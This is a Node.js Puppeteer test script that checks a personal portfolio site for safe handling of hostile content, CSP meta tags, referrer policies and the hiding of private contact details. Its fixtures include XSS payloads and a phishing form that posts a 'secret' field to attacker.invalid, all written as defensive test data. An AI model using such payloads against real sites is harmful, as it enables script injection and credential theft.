const http = require('node:http');
const fs = require('node:fs');
const path = require('node:path');
const puppeteer = require('puppeteer');

const ROOT = path.resolve(__dirname, '..');
const types = { '.css': 'text/css', '.html': 'text/html', '.js': 'application/javascript', '.json': 'application/json', '.md': 'text/markdown' };
const assert = (condition, message) => { if (!condition) throw new Error(message); };

const server = http.createServer((request, response) => {
  if (request.method !== 'GET' && request.method !== 'HEAD') {
    response.writeHead(405, { Allow: 'GET, HEAD' });
    return response.end();
  }
  const pathname = decodeURIComponent(new URL(request.url, 'http://localhost').pathname);
  const file = path.resolve(ROOT, pathname === '/' ? 'index.html' : pathname.replace(/^\/+/, ''));
  if (!file.startsWith(`${ROOT}${path.sep}`) || !fs.existsSync(file) || !fs.statSync(file).isFile()) {
    response.writeHead(404);
    return response.end('Not found');
  }
  response.writeHead(200, { 'Content-Type': types[path.extname(file)] || 'application/octet-stream' });
  if (request.method === 'HEAD') return response.end();
  return fs.createReadStream(file).pipe(response);
});

const hostileMarkdown = `---
title: <img src=x onerror=alert(1)>Unsafe
category: <form action="https://attacker.invalid/collect">Phish</form>
tags: [<img src=x>, safe]
---
# Safe heading
<form action="https://attacker.invalid/collect"><input name="secret"></form>
<style>body{display:none}</style>
<svg onload="alert(1)"></svg>
<a href="javascript:alert(1)">bad</a>
<a href="data:text/html,attack">data</a>
<a href="https://example.com/">good</a>
`;

async function run() {
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const base = `http://127.0.0.1:${server.address().port}`;
  const browser = await puppeteer.launch({ headless: 'new', args: ['--no-sandbox', '--disable-setuid-sandbox'] });
  try {
    const article = await browser.newPage();
    await article.evaluateOnNewDocument(() => {
      window.marked = { setOptions() {}, parse(value) { return value; } };
    });
    await article.setRequestInterception(true);
    article.on('request', (request) => {
      const url = request.url();
      if (url.endsWith('/Blog/posts.json')) {
        request.respond({ status: 200, contentType: 'application/json', body: JSON.stringify([{ id: 'security-test', title: 'Safe' }]) });
      } else if (url.endsWith('/Blog/security-test/article.md')) {
        request.respond({ status: 200, contentType: 'text/markdown', body: hostileMarkdown });
      } else request.continue();
    });
    await article.goto(`${base}/Antigravity/article.html?id=security-test`, { waitUntil: 'networkidle0' });
    const articleState = await article.evaluate(() => ({
      dangerousNodes: document.querySelectorAll('.article-content form, .article-content style, .article-content svg, .article-content script, .article-content iframe, .article-content input').length,
      dangerousLinks: [...document.querySelectorAll('.article-content a[href]')].filter((link) => /^(?:javascript|data):/i.test(link.getAttribute('href'))).length,
      externalRel: document.querySelector('.article-content a[href="https://example.com/"]')?.rel || '',
      titleMarkup: document.querySelector('#article-header img, #article-header form') !== null
    }));
    assert(articleState.dangerousNodes === 0, 'Antigravity rendered hostile article elements');
    assert(articleState.dangerousLinks === 0, 'Antigravity rendered a dangerous article URL');
    assert(!articleState.titleMarkup, 'Antigravity rendered hostile frontmatter markup');
    assert(articleState.externalRel.includes('noopener') && articleState.externalRel.includes('noreferrer'), 'External article link is not isolated');
    await article.close();

    const projects = await browser.newPage();
    await projects.setRequestInterception(true);
    projects.on('request', (request) => {
      if (request.url().startsWith('https://api.github.com/users/krutideepanpanda/repos')) {
        request.respond({
          status: 200,
          contentType: 'application/json',
          headers: { 'Access-Control-Allow-Origin': '*' },
          body: JSON.stringify([{
            private: false,
            owner: { login: 'krutideepanpanda' },
            name: 'safe-repo',
            html_url: 'javascript:alert(1)',
            pushed_at: '2026-01-01T00:00:00Z',
            topics: []
          }])
        });
      } else request.continue();
    });
    await projects.goto(`${base}/Codex/projects.html`, { waitUntil: 'networkidle0' });
    const repositoryHref = await projects.$eval('.repo-card .project-link', (link) => link.href);
    assert(repositoryHref === 'https://github.com/krutideepanpanda/safe-repo', 'Repository URL was not derived from the verified owner and name');
    await projects.close();

    const htmlFiles = [
      'index.html',
      ...fs.readdirSync(path.join(ROOT, 'Codex')).filter((name) => name.endsWith('.html')).map((name) => `Codex/${name}`),
      ...fs.readdirSync(path.join(ROOT, 'Antigravity')).filter((name) => name.endsWith('.html')).map((name) => `Antigravity/${name}`)
    ];
    htmlFiles.forEach((relative) => {
      const html = fs.readFileSync(path.join(ROOT, relative), 'utf8');
      assert(/http-equiv=["']Content-Security-Policy["']/i.test(html), `${relative} has no CSP`);
      assert(/name=["']referrer["']/i.test(html), `${relative} has no referrer policy`);
    });
    const deployableSources = ['Antigravity/contact.html', 'Antigravity/script.js', 'Codex/contact.html'];
    deployableSources.forEach((relative) => {
      const source = fs.readFileSync(path.join(ROOT, relative), 'utf8');
      assert(!/phoneB64|obf-phone|href\s*=\s*["']tel:/i.test(source), `${relative} exposes private phone handling`);
    });

    for (const route of ['/', '/Codex/index.html', '/Antigravity/index.html']) {
      const page = await browser.newPage();
      const policyViolations = [];
      page.on('console', (message) => {
        if (/content security policy/i.test(message.text())) policyViolations.push(message.text());
      });
      await page.goto(`${base}${route}`, { waitUntil: 'networkidle0' });
      assert(policyViolations.length === 0, `${route} produced a CSP violation: ${policyViolations.join(' | ')}`);
      await page.close();
    }
    console.log('Security audit passed: hostile content, repository URLs, CSP, and private-contact boundaries.');
  } finally {
    await browser.close();
    await new Promise((resolve) => server.close(resolve));
  }
}

run().catch((error) => { console.error(error.message); process.exitCode = 1; });
